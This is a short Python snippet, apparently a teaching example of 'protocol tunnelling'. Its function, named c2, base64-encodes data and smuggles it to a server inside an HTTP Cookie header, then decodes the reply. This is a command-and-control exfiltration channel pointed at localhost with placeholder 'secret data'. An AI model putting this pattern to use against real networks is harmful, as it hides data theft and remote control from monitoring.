#py4 protocol tunnelling
import requests
from base64 import b64encode, b64decode

def c2(url, data):
    response= requests.get( url, headers={'Cookie': b64encode(data)})
    print( b64decode( response.content))

url='http://127.0.0.1:8443'
data= bytes( 'secret data', 'utf-8')
c2( url, data)